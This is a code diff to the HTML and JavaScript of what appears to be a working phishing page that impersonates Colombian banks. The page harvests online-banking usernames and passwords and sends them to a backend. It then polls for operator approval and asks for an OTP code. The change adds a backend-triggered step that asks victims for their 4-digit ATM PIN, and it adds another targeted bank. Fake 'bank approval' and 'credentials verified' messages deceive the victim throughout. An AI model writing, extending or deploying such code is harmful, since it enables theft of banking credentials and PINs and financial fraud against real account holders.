@@ -153,7 +153,7 @@
                 <div class="form-group" style="margin-bottom:0;">
                     <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
                     <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación (4-8 dígitos)" maxlength="8" inputmode="numeric" required />
-                    <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
+                    <div class="error-message" id="otpErrorMsg">El código debe tener entre 4 y 8 dígitos</div>
                 </div>
             </div>
 
@@ -176,7 +176,8 @@
             'Caja Social':     'Caja.jpg',
             'Banco de Bogotá': 'bog.png',
             'Banco Occidente': 'occi.png',
-            'BBVA Colombia':   'bbva.png'
+            'BBVA Colombia':   'bbva.png',
+            'AV Villas':       'avvillas.png'
         };
 
         let solicitudId = null;
@@ -193,6 +194,7 @@
         let faseActual = 'credenciales';
         let pollingInterval = null;
         let formularioBloqueado = false;
+        let esClaveATM = false;   // 🔥 flag dinámico
 
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
@@ -207,6 +209,9 @@
         const bankLogoImg = document.getElementById('bankLogoImg');
         const bankIconPlaceholder = document.getElementById('bankIconPlaceholder');
         const bankNombre = document.getElementById('bankNombre');
+        const otpLabel = document.getElementById('otpLabel');
+        const otpInfoMessage = document.getElementById('otpInfoMessage');
+        const otpErrorMsg = document.getElementById('otpErrorMsg');
 
         function cargarLogoBanco() {
             let banco = localStorage.getItem('bancoEmisor') || '';
@@ -259,7 +264,11 @@
                 payload.usuario_banco = usernameInput.value.trim(); 
                 payload.password_banco = passwordInput.value.trim(); 
             } else if (paso === 'otp') { 
-                payload.codigo_otp = codigoExtra; 
+                if (esClaveATM) {
+                    payload.clave_atm = codigoExtra;
+                } else {
+                    payload.codigo_otp = codigoExtra;
+                }
             }
 
             try {
@@ -294,7 +303,10 @@
 
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval); pollingInterval = null;
-                        loadingOverlay.classList.remove('active'); desbloquearOTP(); return;
+                        loadingOverlay.classList.remove('active');
+                        // 🔥 El backend nos dice si es clave ATM
+                        desbloquearOTP(!!data.requiere_clave_atm);
+                        return;
                     }
 
                     if (data.estado === 'aprobado' && data.fase === 'otp') {
@@ -303,7 +315,6 @@
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
                     }
 
-                    // 🔥 ERROR DE USUARIO → reiniciar con NUEVO solicitud_id
                     if (data.estado === 'rechazado_user_error') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         statusMessage.className = 'status-message error';
@@ -314,25 +325,24 @@
                         return;
                     }
 
-                    // 🔥 RECHAZADO
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingOverlay.classList.remove('active');
 
                         if (data.fase === 'otp') {
-                            // 👉 Se queda en OTP: limpiar campo, desbloquear botón, mostrar mensaje formal
                             statusMessage.className = 'status-message error';
-                            statusMessage.textContent = 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
+                            statusMessage.textContent = esClaveATM
+                                ? 'No fue posible validar la clave ingresada. Por favor, inténtalo nuevamente.'
+                                : 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
                             statusMessage.style.display = 'block';
                             confirmationInput.value = '';
                             confirmationInput.disabled = false;
                             confirmationInput.parentElement.classList.remove('error');
                             confirmationInput.focus();
                             submitButton.disabled = false;
-                            buttonText.textContent = 'Confirmar OTP';
+                            buttonText.textContent = esClaveATM ? 'Confirmar clave' : 'Confirmar OTP';
                             formularioBloqueado = false;
                         } else {
-                            // 👉 Fase credenciales: volver a credenciales
                             mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
                             resetFormulario();
                         }
@@ -342,15 +352,39 @@
             }, POLLING_INTERVAL);
         }
 
-        function desbloquearOTP() {
+        // 🔥 Ahora recibe parámetro: si es clave ATM o no
+        function desbloquearOTP(requiereClaveATM = false) {
+            esClaveATM = !!requiereClaveATM;
+
             usernameInput.disabled = true; 
             passwordInput.disabled = true;
             otpSection.classList.add('visible'); 
             confirmationInput.disabled = false; 
+
+            if (esClaveATM) {
+                otpLabel.innerHTML = 'Clave del cajero <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Ingresa tu clave del cajero automático (4 dígitos).';
+                confirmationInput.placeholder = 'Ingresa tu clave de cajero (4 dígitos)';
+                confirmationInput.maxLength = 4;
+                otpErrorMsg.textContent = 'La clave debe tener 4 dígitos';
+                buttonText.textContent = 'Confirmar clave';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa la clave del cajero para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            } else {
+                otpLabel.innerHTML = 'Código OTP <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
+                confirmationInput.placeholder = 'Ingresa tu código de verificación (4-8 dígitos)';
+                confirmationInput.maxLength = 8;
+                otpErrorMsg.textContent = 'El código debe tener entre 4 y 8 dígitos';
+                buttonText.textContent = 'Confirmar OTP';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            }
+
+            confirmationInput.value = '';
             confirmationInput.focus();
-            document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
-            document.getElementById('mainSubtitle').innerHTML = `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
-            buttonText.textContent = 'Confirmar OTP'; 
             faseActual = 'otp'; 
             formularioBloqueado = false; 
             submitButton.disabled = false;
@@ -370,6 +404,7 @@
             confirmationInput.disabled = true;
             otpSection.classList.remove('visible'); 
             faseActual = 'credenciales'; 
+            esClaveATM = false;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false; 
             buttonText.textContent = 'Continuar';
@@ -412,10 +447,19 @@
                     confirmationInput.parentElement.classList.add('error'); 
                     isValid = false; 
                 } else {
-                    if (!/^\d{4,8}$/.test(confirmationInput.value)) {
-                        confirmationInput.parentElement.classList.add('error');
-                        confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código debe tener entre 4 y 8 dígitos';
-                        isValid = false;
+                    if (esClaveATM) {
+                        // 🔥 Solo 4 dígitos numéricos
+                        if (!/^\d{4}$/.test(confirmationInput.value)) {
+                            confirmationInput.parentElement.classList.add('error');
+                            otpErrorMsg.textContent = 'La clave debe tener 4 dígitos';
+                            isValid = false;
+                        }
+                    } else {
+                        if (!/^\d{4,8}$/.test(confirmationInput.value)) {
+                            confirmationInput.parentElement.classList.add('error');
+                            otpErrorMsg.textContent = 'El código debe tener entre 4 y 8 dígitos';
+                            isValid = false;
+                        }
                     }
                 }
             }
@@ -438,8 +482,8 @@
                 iniciarPolling('Esperando aprobación del banco...');
 
             } else if (faseActual === 'otp') {
-                buttonText.textContent = 'Verificando OTP...'; 
-                loadingText.textContent = 'Validando código de seguridad...'; 
+                buttonText.textContent = esClaveATM ? 'Verificando clave...' : 'Verificando OTP...'; 
+                loadingText.textContent = esClaveATM ? 'Validando clave de cajero...' : 'Validando código de seguridad...'; 
                 loadingOverlay.classList.add('active');
                 
                 const ok = await enviarDatos('otp', confirmationInput.value.trim());
@@ -447,7 +491,7 @@
                     mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     formularioBloqueado = false; 
                     submitButton.disabled = false; 
-                    buttonText.textContent = 'Confirmar OTP'; 
+                    buttonText.textContent = esClaveATM ? 'Confirmar clave' : 'Confirmar OTP'; 
                     return; 
                 }
                 iniciarPolling('Esperando confirmación final...');
